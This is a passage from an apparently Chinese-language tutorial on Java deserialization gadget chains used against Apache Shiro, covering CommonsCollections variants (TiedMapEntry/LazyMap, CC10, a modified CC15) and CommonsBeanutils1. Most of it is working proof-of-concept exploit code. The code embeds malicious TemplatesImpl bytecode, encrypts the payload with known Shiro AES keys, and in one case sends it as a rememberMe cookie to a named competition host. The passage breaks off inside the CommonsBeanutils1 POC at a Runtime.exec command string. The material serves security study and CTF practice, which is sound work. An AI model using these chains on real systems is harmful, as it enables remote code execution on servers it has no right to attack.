<h3 id="&#x6784;&#x5EFA;&#x65E0;&#x6570;&#x7EC4;-gadget">&#x6784;&#x5EFA;&#x65E0;&#x6570;&#x7EC4; gadget</h3>
<p>&#x901A;&#x8FC7;TiedMapEntry&#x4F5C;&#x4E3A;&#x4E2D;&#x7EE7;, &#x8C03;&#x7528;LazyMap/DefaultedMap&#x7684;get&#x65B9;&#x6CD5;, &#x5176;&#x4E2D;TiedMapEntry&#x4E2D;&#x7684;key&#x548C;value&#x90FD;&#x53EF;&#x63A7;, &#x800C;&#x770B;&#x4E00;&#x4E0B;LazyMap.get</p>
<pre><code class="lang-java">    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">get</span><span class="hljs-params">(Object key)</span> </span>{
        <span class="hljs-comment">// create value for key if key is not currently in the map</span>
        <span class="hljs-keyword">if</span> (map.containsKey(key) == <span class="hljs-keyword">false</span>) {
            <span class="hljs-comment">// &#x4F20;&#x5165;&#x7684;key&#x503C;&#x53EF;&#x63A7;, factory&#x53EF;&#x63A7;</span>
            Object value = factory.transform(key);
            map.put(key, value);
            <span class="hljs-keyword">return</span> value;
        }
        <span class="hljs-keyword">return</span> map.get(key);
    }
</code></pre>
<p>&#x5C06;&#x6784;&#x9020;&#x597D;&#x7684;<code>TemplatesImpl</code>&#xFF08;key&#xFF09;&#x4F5C;&#x4E3A;<code>InvokerTransformer.transform</code>&#x51FD;&#x6570;&#x7684;<code>input</code>&#x4F20;&#x5165;&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x5C06;templates gadgets&#x4E32;&#x8D77;&#x6765;&#x4E86;, &#x4E5F;&#x5C31;&#x662F;&#x901A;&#x8FC7;<code>InvokerTransformer.transform</code>&#x53BB;&#x8C03;&#x7528;<code>TemplatesImpl.newTransformer</code>&#x4ECE;&#x800C;&#x89E6;&#x53D1;&#x5B57;&#x8282;&#x7801;&#x547D;&#x4EE4;&#x6267;&#x884C;</p>
<p>POC</p>
<pre><code class="lang-java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
<span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;
<span class="hljs-keyword">import</span> org.apache.commons.collections.map.DefaultedMap;
<span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;

<span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;
<span class="hljs-keyword">import</span> java.io.ObjectOutputStream;
<span class="hljs-keyword">import</span> java.lang.reflect.Field;
<span class="hljs-keyword">import</span> java.util.HashMap;
<span class="hljs-keyword">import</span> java.util.Map;

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommonsCollectionsShiro</span> </span>{
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">byte</span>[] getPayload(<span class="hljs-keyword">byte</span>[] clazzBytes) <span class="hljs-keyword">throws</span> Exception {
        TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();
        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]{clazzBytes});
        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;EvilTemplatesImpl&quot;</span>);
        setFieldValue(templates, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-keyword">null</span>);
<span class="hljs-comment">//        setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span>

        Transformer transformer = <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getClass&quot;</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>);

        Map innerMap = <span class="hljs-keyword">new</span> HashMap();
<span class="hljs-comment">//        Map outerMap = LazyMap.decorate(innerMap, transformer);</span>
        Map outerMap = DefaultedMap.decorate(innerMap, transformer);

        TiedMapEntry tiedmapentry = <span class="hljs-keyword">new</span> TiedMapEntry(outerMap, templates);
        Map expMap = <span class="hljs-keyword">new</span> HashMap();
        expMap.put(tiedmapentry, <span class="hljs-string">&quot;valuevalue&quot;</span>);

        <span class="hljs-comment">// &#x6E05;&#x9664;&#x952E;&#x503C;</span>
        outerMap.clear();
        <span class="hljs-comment">// &#x901A;&#x8FC7;&#x53CD;&#x5C04;&#x8986;&#x76D6;&#x539F;&#x672C;&#x7684;iMethodName&#xFF0C;&#x9632;&#x6B62;&#x5E8F;&#x5217;&#x5316;&#x65F6;&#x5728;&#x672C;&#x5730;&#x89E6;&#x53D1;&#x6076;&#x610F;&#x65B9;&#x6CD5;</span>
        setFieldValue(transformer, <span class="hljs-string">&quot;iMethodName&quot;</span>, <span class="hljs-string">&quot;newTransformer&quot;</span>);

        <span class="hljs-comment">// &#x751F;&#x6210;&#x5E8F;&#x5217;&#x5316;&#x5B57;&#x7B26;&#x4E32;</span>
        ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> ByteArrayOutputStream();
        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(barr);
        oos.writeObject(expMap);
        oos.close();

        <span class="hljs-keyword">return</span> barr.toByteArray();
    }

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception </span>{
        <span class="hljs-keyword">final</span> Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> </span>{
        Field field = <span class="hljs-keyword">null</span>;
        <span class="hljs-keyword">try</span> {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(<span class="hljs-keyword">true</span>);
        }
        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) {
            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-keyword">null</span>)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        <span class="hljs-keyword">return</span> field;
    }
}
</code></pre>
<p>&#x52A0;&#x5BC6;&#x8C03;&#x7528;</p>
<pre><code class="lang-java"><span class="hljs-keyword">import</span> javassist.ClassPool;
<span class="hljs-keyword">import</span> javassist.CtClass;
<span class="hljs-keyword">import</span> org.apache.shiro.crypto.AesCipherService;
<span class="hljs-keyword">import</span> org.apache.shiro.util.ByteSource;

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Client</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String []args)</span> <span class="hljs-keyword">throws</span> Exception </span>{
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(Evil.class.getName());
        <span class="hljs-keyword">byte</span>[] payloads = <span class="hljs-keyword">new</span> CommonsCollectionsShiro().getPayload(clazz.toBytecode());

        AesCipherService aes = <span class="hljs-keyword">new</span> AesCipherService();
        <span class="hljs-keyword">byte</span>[] key = java.util.Base64.getDecoder().decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);

        ByteSource ciphertext = aes.encrypt(payloads, key);
        System.out.println(ciphertext.toString());
    }
}
</code></pre>
<p>&#x89E6;&#x53D1;&#x6548;&#x679C;&#x5982;&#x4E0B;</p>
<p><img src="img/shiro.gif" alt="shiro"></p>
<p>&#x7528;CommonsCollections10&#x4E5F;&#x662F;&#x53EF;&#x4EE5;&#x7684;</p>
<pre><code class="lang-java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
<span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;
<span class="hljs-keyword">import</span> org.apache.commons.collections.map.DefaultedMap;
<span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;

<span class="hljs-keyword">import</span> java.io.*;
<span class="hljs-keyword">import</span> java.lang.reflect.Field;
<span class="hljs-keyword">import</span> java.util.HashMap;
<span class="hljs-keyword">import</span> java.util.Hashtable;
<span class="hljs-keyword">import</span> java.util.Map;

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommonsCollections10</span> </span>{
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">byte</span>[] getPayload(<span class="hljs-keyword">byte</span>[] clazzBytes) <span class="hljs-keyword">throws</span> Exception {
        TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();
        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]{clazzBytes});
        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;EvilTemplatesImpl&quot;</span>);
        setFieldValue(templates, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-keyword">null</span>);
<span class="hljs-comment">//        setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span>

        Transformer transformer = <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getClass&quot;</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>);

        Map innerMap = <span class="hljs-keyword">new</span> HashMap();
<span class="hljs-comment">//        Map outerMap = LazyMap.decorate(innerMap, transformer);</span>
        Map outerMap = DefaultedMap.decorate(innerMap, transformer);
        TiedMapEntry tiedMapEntry1 = <span class="hljs-keyword">new</span> TiedMapEntry(outerMap, templates);

        <span class="hljs-comment">// Use the colliding Maps as keys in Hashtable</span>
        Hashtable hashtable = <span class="hljs-keyword">new</span> Hashtable();
        hashtable.put(<span class="hljs-string">&quot;keykey&quot;</span>, <span class="hljs-number">1</span>);

        <span class="hljs-comment">// &#x83B7;&#x53D6;hashtable&#x7684;table&#x7C7B;&#x5C5E;&#x6027;</span>
        Field tableField = Hashtable.class.getDeclaredField(<span class="hljs-string">&quot;table&quot;</span>);
        tableField.setAccessible(<span class="hljs-keyword">true</span>);
        Object[] table = (Object[])tableField.get(hashtable);
        Object tiedMapEntry2 = table[<span class="hljs-number">0</span>];
        <span class="hljs-keyword">if</span>(tiedMapEntry2 == <span class="hljs-keyword">null</span>)
            tiedMapEntry2 = table[<span class="hljs-number">1</span>];
        <span class="hljs-comment">// &#x83B7;&#x53D6;Hashtable.Entry&#x7684;key&#x5C5E;&#x6027;</span>
        Field keyField = tiedMapEntry2.getClass().getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);
        keyField.setAccessible(<span class="hljs-keyword">true</span>);
        <span class="hljs-comment">// &#x5C06;key&#x5C5E;&#x6027;&#x7ED9;&#x66FF;&#x6362;&#x6210;&#x6784;&#x9020;&#x597D;&#x7684;TiedMapEntry&#x5B9E;&#x4F8B;</span>
        keyField.set(tiedMapEntry2, tiedMapEntry1);

        <span class="hljs-comment">//&#x901A;&#x8FC7;&#x53CD;&#x5C04;&#x8986;&#x76D6;&#x539F;&#x672C;&#x7684;iTransformers&#xFF0C;&#x9632;&#x6B62;&#x5E8F;&#x5217;&#x5316;&#x65F6;&#x5728;&#x672C;&#x5730;&#x6267;&#x884C;&#x547D;&#x4EE4;</span>
        setFieldValue(transformer, <span class="hljs-string">&quot;iMethodName&quot;</span>, <span class="hljs-string">&quot;newTransformer&quot;</span>);

        <span class="hljs-comment">// &#x5B57;&#x8282;&#x8C03;&#x7528;&#x5199;&#x6CD5;</span>
        ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> ByteArrayOutputStream();
        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(barr);
        oos.writeObject(hashtable);
        oos.close();

        <span class="hljs-keyword">return</span> barr.toByteArray();
    }

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception </span>{
        <span class="hljs-keyword">final</span> Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> </span>{
        Field field = <span class="hljs-keyword">null</span>;
        <span class="hljs-keyword">try</span> {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(<span class="hljs-keyword">true</span>);
        }
        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) {
            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-keyword">null</span>)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        <span class="hljs-keyword">return</span> field;
    }
}
</code></pre>
<h3 id="cc15&#x6539;&#x88C5;&#x6784;&#x9020;">CC15&#x6539;&#x88C5;&#x6784;&#x9020;</h3>
<p>CC4&#x4E2D;&#x7684;InstantiateTransformer&#x4E5F;&#x53EF;&#x7528;&#x4E8E;CommonsCollections 3.2.1, &#x9AD8;&#x7248;&#x672C; <code>_tfactory</code> &#x9700;&#x8981;&#x81EA;&#x884C;&#x6DFB;&#x52A0;, Shiro&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x65F6;&#x4E0D;&#x4F1A;&#x81EA;&#x52A8;&#x8865;&#x5145;, &#x4E5F;&#x662F;&#x6E90;&#x4E8E;&#x4E00;&#x6B21;&#x6BD4;&#x8D5B;&#x7684;&#x6784;&#x9020;</p>
<pre><code class="lang-java"><span class="hljs-keyword">package</span> CommonsBeanutils;

<span class="hljs-keyword">import</span> cn.hutool.http.HttpRequest;
<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
<span class="hljs-keyword">import</span> javassist.ClassPool;
<span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;
<span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;
<span class="hljs-keyword">import</span> org.apache.shiro.crypto.AesCipherService;
<span class="hljs-keyword">import</span> org.apache.shiro.util.ByteSource;

<span class="hljs-keyword">import</span> javax.xml.transform.Templates;
<span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;
<span class="hljs-keyword">import</span> java.io.ObjectOutputStream;
<span class="hljs-keyword">import</span> java.lang.reflect.Field;
<span class="hljs-keyword">import</span> java.util.Base64;
<span class="hljs-keyword">import</span> java.util.HashMap;
<span class="hljs-keyword">import</span> java.util.Map;

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommonsCollectionsShiro2</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>{
        TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();
        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]{ClassPool.getDefault().get(Evil.class.getName()).toBytecode()});
        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;EvilTemplatesImpl&quot;</span>);
        setFieldValue(templates, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-keyword">null</span>);
        setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> TransformerFactoryImpl());

        Transformer faketransformer = <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getClass&quot;</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>);
        Transformer transformer = <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]{Templates.class}, <span class="hljs-keyword">new</span> Object[]{templates});

        Map innerMap = <span class="hljs-keyword">new</span> HashMap();
        Map outerMap = LazyMap.decorate(innerMap, faketransformer);
<span class="hljs-comment">//        Map outerMap = DefaultedMap.decorate(innerMap, transformer);</span>

        TiedMapEntry tiedmapentry = <span class="hljs-keyword">new</span> TiedMapEntry(outerMap, TrAXFilter.class);
        Map expMap = <span class="hljs-keyword">new</span> HashMap();
        expMap.put(tiedmapentry, <span class="hljs-string">&quot;valuevalue&quot;</span>);

        <span class="hljs-comment">// &#x6E05;&#x9664;&#x952E;&#x503C;</span>
        outerMap.clear();
        <span class="hljs-comment">// &#x901A;&#x8FC7;&#x53CD;&#x5C04;&#x8986;&#x76D6;&#x539F;&#x672C;&#x7684;factory&#xFF0C;&#x9632;&#x6B62;&#x5E8F;&#x5217;&#x5316;&#x65F6;&#x5728;&#x672C;&#x5730;&#x89E6;&#x53D1;&#x6076;&#x610F;&#x65B9;&#x6CD5;</span>
        setFieldValue(outerMap, <span class="hljs-string">&quot;factory&quot;</span>, transformer);

        <span class="hljs-comment">// &#x751F;&#x6210;&#x5E8F;&#x5217;&#x5316;&#x5B57;&#x7B26;&#x4E32;</span>
        ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> ByteArrayOutputStream();
        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(barr);
        oos.writeObject(expMap);
        oos.close();

        <span class="hljs-keyword">byte</span>[] key = Base64.getDecoder().decode(<span class="hljs-string">&quot;7Bhs26ccN6i/0AT9GhZULF==&quot;</span>);

        AesCipherService aes = <span class="hljs-keyword">new</span> AesCipherService();
        ByteSource ciphertext = aes.encrypt(barr.toByteArray(), key);
<span class="hljs-comment">//        System.out.println(ciphertext.toString());</span>
        String rem = ciphertext.toString();

        <span class="hljs-comment">// &#x6D4B;&#x8BD5;</span>
<span class="hljs-comment">//        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));</span>
<span class="hljs-comment">//        ois.readObject();</span>
<span class="hljs-comment">//        ois.close();</span>

        String url=<span class="hljs-string">&quot;http://eci-2zefymd8icss9keczft1.cloudeci1.ichunqiu.com:8888/ricky&quot;</span>;
        HttpRequest httpRequest = HttpRequest.get(url).cookie(<span class="hljs-string">&quot;rememberMe=&quot;</span>+rem);
        httpRequest.execute();
    }

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception </span>{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(<span class="hljs-keyword">true</span>);
        field.set(obj, value);
    }
}
</code></pre>
<p>&#x9700;&#x8981;&#x6DFB;&#x52A0;&#x7684;&#x4F9D;&#x8D56;</p>
<pre><code>    &lt;!--http &#x4F20;&#x8F93;--&gt;
    &lt;dependency&gt;
      &lt;groupId&gt;cn.hutool&lt;/groupId&gt;
      &lt;artifactId&gt;hutool-all&lt;/artifactId&gt;
      &lt;version&gt;5.7.22&lt;/version&gt;
    &lt;/dependency&gt;
</code></pre><h2 id="commonsbeanutils">CommonsBeanutils</h2>
<p>JavaBean</p>
<p>&#x5982;&#x679C;&#x4E00;&#x4E2A;&#x7C7B;&#x7684;&#x8BFB;&#x5199;&#x65B9;&#x6CD5;&#x7B26;&#x5408;&#x4EE5;&#x4E0B;&#x8FD9;&#x79CD;&#x547D;&#x540D;&#x89C4;&#x8303;&#xFF1A;</p>
<pre><code>// &#x8BFB;&#x65B9;&#x6CD5;:
public Type getXyz()
// &#x5199;&#x65B9;&#x6CD5;:
public void setXyz(Type value)
</code></pre><p>&#x90A3;&#x4E48;&#x8FD9;&#x79CD;<code>class</code>&#x88AB;&#x79F0;&#x4E3A;<code>JavaBean</code></p>
<p>&#x4F8B;&#x5982;&#x8BE5;Cat&#x7C7B;&#x5C31;&#x662F;&#x4E00;&#x4E2D;JavaBean</p>
<pre><code class="lang-java"><span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cat</span> </span>{ 
    <span class="hljs-keyword">private</span> String name = <span class="hljs-string">&quot;catalina&quot;</span>; 
    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getName</span><span class="hljs-params">()</span> </span>{ 
        <span class="hljs-keyword">return</span> name; 
    }
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(String name)</span> </span>{ 
        <span class="hljs-keyword">this</span>.name = name; 
    } 
}
</code></pre>
<p>commons-beanutils&#x4E2D;&#x63D0;&#x4F9B;&#x4E86;&#x4E00;&#x4E2A;&#x9759;&#x6001;&#x65B9;&#x6CD5; PropertyUtils.getProperty &#xFF0C;&#x8BA9;&#x4F7F;&#x7528;&#x8005;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x8C03;&#x7528;&#x4EFB;&#x610F;JavaBean&#x7684;getter&#x65B9;&#x6CD5;</p>
<pre><code class="lang-java">PropertyUtils.getProperty(<span class="hljs-keyword">new</span> Cat(), <span class="hljs-string">&quot;name&quot;</span>);
</code></pre>
<p>commons-beanutils&#x4F1A;&#x81EA;&#x52A8;&#x627E;&#x5230;name&#x5C5E;&#x6027;&#x7684;getter&#x65B9;&#x6CD5;&#xFF0C;&#x4E5F;&#x5C31;&#x662F; getName&#xFF0C;&#x7136;&#x540E;&#x8C03;&#x7528;&#xFF0C;&#x83B7;&#x5F97;&#x8FD4;&#x56DE;&#x503C;&#x3002;&#x9664;&#x6B64;&#x4E4B;&#x5916;&#xFF0C;PropertyUtils.getProperty &#x8FD8;&#x652F;&#x6301;&#x9012;&#x5F52;&#x83B7;&#x53D6;&#x5C5E;&#x6027;&#xFF0C;&#x6BD4;&#x5982;a&#x5BF9;&#x8C61;&#x4E2D;&#x6709;&#x5C5E;&#x6027;b&#xFF0C;b&#x5BF9;&#x8C61;&#x4E2D;&#x6709;&#x5C5E;&#x6027;c&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; PropertyUtils.getProperty(a, &quot;b.c&quot;); &#x7684;&#x65B9;&#x5F0F;&#x8FDB;&#x884C;&#x9012;&#x5F52;&#x83B7;&#x53D6;&#x3002;&#x901A;&#x8FC7;&#x8FD9;&#x4E2A;&#x65B9;&#x6CD5;&#xFF0C;&#x4F7F;&#x7528;&#x8005;&#x53EF;&#x4EE5;&#x5F88;&#x65B9;&#x4FBF;&#x5730;&#x8C03;&#x7528;&#x4EFB;&#x610F;&#x5BF9;&#x8C61;&#x7684;getter&#xFF0C;&#x9002;&#x7528;&#x4E8E;&#x5728;&#x4E0D;&#x786E;&#x5B9A;JavaBean&#x662F;&#x54EA;&#x4E2A;&#x7C7B;&#x5BF9;&#x8C61;&#x65F6;&#x4F7F;&#x7528;</p>
<p>commons-beanutils&#x4E2D;&#x6709;&#x4E2A;BeanComparator, &#x7B26;&#x5408;CommonsCollections4&#x4E2D;&#x9700;&#x8981;comparator&#x89E6;&#x53D1;&#x7684;&#x6761;&#x4EF6;, &#x5F53;&#x5176;&#x8C03;&#x7528;compare&#x65B9;&#x6CD5;&#x65F6;, &#x8DDF;&#x8FDB;<code>BeanComparator#compare()</code></p>
<pre><code class="lang-java">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">compare</span><span class="hljs-params">( Object o1, Object o2 )</span> </span>{

        <span class="hljs-keyword">if</span> ( property == <span class="hljs-keyword">null</span> ) {
            <span class="hljs-comment">// compare the actual objects</span>
            <span class="hljs-keyword">return</span> comparator.compare( o1, o2 );
        }

        <span class="hljs-keyword">try</span> {
            Object value1 = PropertyUtils.getProperty( o1, property );
            Object value2 = PropertyUtils.getProperty( o2, property );
            <span class="hljs-keyword">return</span> comparator.compare( value1, value2 );
        }
        <span class="hljs-keyword">catch</span> ( IllegalAccessException iae ) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException( <span class="hljs-string">&quot;IllegalAccessException: &quot;</span> + iae.toString() );
        } 
        <span class="hljs-keyword">catch</span> ( InvocationTargetException ite ) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException( <span class="hljs-string">&quot;InvocationTargetException: &quot;</span> + ite.toString() );
        }
        <span class="hljs-keyword">catch</span> ( NoSuchMethodException nsme ) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException( <span class="hljs-string">&quot;NoSuchMethodException: &quot;</span> + nsme.toString() );
        } 
    }
</code></pre>
<p>&#x5047;&#x8BBE;o1&#x662F; TemplateImpl &#x5B9E;&#x4F8B;, &#x800C;o2&#x662F; outputProperties , &#x5219;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; PropertyUtils.getProperty &#x8C03;&#x7528;<code>TemplatesImpl#getOutputProperties()</code>&#x4ECE;&#x800C;&#x89E6;&#x53D1;&#x4EE3;&#x7801;&#x6267;&#x884C;, &#x5176;&#x4E2D; &#x5B9E;&#x4F8B;&#x662F;&#x7531; PriorityQueue &#x4F20;&#x5165;&#x7684;, &#x800C; outputProperties &#x662F; BeanComparator &#x4E2D;&#x7684;&#x5C5E;&#x6027;</p>
<pre><code class="lang-java"><span class="hljs-keyword">private</span> String property;
</code></pre>
<p>POC</p>
<pre><code class="lang-java"><span class="hljs-keyword">package</span> CommonsCollections;

<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
<span class="hljs-keyword">import</span> javassist.ClassClassPath;
<span class="hljs-keyword">import</span> javassist.ClassPool;
<span class="hljs-keyword">import</span> javassist.CtClass;
<span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;

<span class="hljs-keyword">import</span> java.io.FileInputStream;
<span class="hljs-keyword">import</span> java.io.FileOutputStream;
<span class="hljs-keyword">import</span> java.io.ObjectInputStream;
<span class="hljs-keyword">import</span> java.io.ObjectOutputStream;
<span class="hljs-keyword">import</span> java.lang.reflect.Field;
<span class="hljs-keyword">import</span> java.util.PriorityQueue;

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommonsBeanutils1</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>{
        <span class="hljs-comment">// &#x5B9E;&#x4F8B;&#x5316;&#x4E00;&#x4E2A;BeanComparator&#x5BF9;&#x8C61;</span>
        BeanComparator beanComparator = <span class="hljs-keyword">new</span> BeanComparator();
        setFieldValue(beanComparator, <span class="hljs-string">&quot;property&quot;</span>, <span class="hljs-string">&quot;outputProperties&quot;</span>);
        <span class="hljs-comment">// ClassPool&#x662F; CtClass &#x5BF9;&#x8C61;&#x7684;&#x5BB9;&#x5668;&#x3002;&#x5B9E;&#x4F8B;&#x5316;&#x4E00;&#x4E2A;ClassPool&#x5BB9;&#x5668;&#x3002;</span>
        ClassPool classPool = ClassPool.getDefault();
        <span class="hljs-comment">// &#x5411;&#x5BB9;&#x5668;&#x4E2D;&#x7684;&#x7C7B;&#x641C;&#x7D22;&#x8DEF;&#x5F84;&#x7684;&#x8D77;&#x59CB;&#x4F4D;&#x7F6E;&#x63D2;&#x5165;AbstractTranslet.class&#xFF0C;&#x4E2A;&#x4EBA;&#x8BA4;&#x4E3A;&#x662F;&#x65B9;&#x4FBF;&#x8BA9;&#x540E;&#x9762;&#x80FD;&#x591F;&#x627E;&#x5230;&#x8FD9;&#x4E2A;&#x7C7B;</span>
        classPool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));
        <span class="hljs-comment">// &#x4F7F;&#x7528;&#x5BB9;&#x5668;&#x65B0;&#x5EFA;&#x4E00;&#x4E2A;CtClass&#xFF0C;&#x76F8;&#x5F53;&#x4E8E;&#x65B0;&#x5EFA;&#x4E00;&#x4E2A;class&#xFF0C;&#x7C7B;&#x540D;&#x4E3A;Evil</span>
        CtClass ctClass = classPool.makeClass(<span class="hljs-string">&quot;Evil&quot;</span>);
        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;%s\&quot;);&quot;</span>;
